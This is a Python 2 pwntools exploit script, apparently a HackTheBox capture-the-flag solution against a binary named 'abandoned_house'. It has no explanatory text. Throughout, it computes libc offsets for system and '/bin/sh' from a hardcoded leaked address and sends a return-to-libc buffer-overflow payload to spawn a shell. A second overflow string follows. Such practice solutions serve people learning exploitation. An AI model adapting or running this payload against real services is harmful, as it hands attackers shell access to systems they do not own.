from pwn import *

#io = remote('docker.hackthebox.eu',31264)
#io = remote('127.0.0.1',1234)
io = process('./abandoned_house')
print io.recvuntil('>')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


print_offset=libc.symbols['printf']
binsh_offset = list(libc.search('/bin/sh'))[0]
system_offset=libc.symbols['system']
#print hex(print_offset), hex(system_offset), hex(binsh_offset)
libc_base=0x7ffff7a46f70-print_offset
system_addr=libc_base+system_offset
binsh_addr=libc_base+binsh_offset
#print hex(libc_base)
#print hex(system_addr)
#print hex(binsh_addr)

#psys = p64(0x7ffff7a46f70)
psys = p64(system_addr)
pbsh = p64(binsh_addr)

io.sendline('y'*4+psys+8*'A'+pbsh)

print io.recvuntil('>')
#+0x30+4
io.sendline(32*'A'+10*'\x54')
#io.interactive()
#'''
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
#'''

